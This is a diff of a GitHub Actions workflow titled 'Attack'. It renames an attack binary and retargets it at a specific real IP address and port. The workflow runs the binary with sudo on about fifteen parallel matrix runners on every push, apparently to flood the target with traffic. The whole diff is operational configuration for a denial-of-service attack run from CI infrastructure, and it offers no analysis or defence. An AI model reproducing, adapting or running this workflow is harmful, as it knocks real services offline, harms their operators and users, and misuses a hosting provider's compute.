@@ -1,8 +1,8 @@
-name: soul Attack
+name: raja Attack
 on: [push]
 
 jobs:
-  soul:
+  raja:
     runs-on: ubuntu-22.04
     strategy:
       matrix:
@@ -10,5 +10,5 @@ jobs:
             11,12,13,14,15]
     steps:
     - uses: actions/checkout@v3
-    - run: chmod +x soul
-    - run: sudo ./soul 91.108.17.6 32001 800 999
+    - run: chmod +x raja
+    - run: sudo ./raja 91.108.17.41 32003 90 999
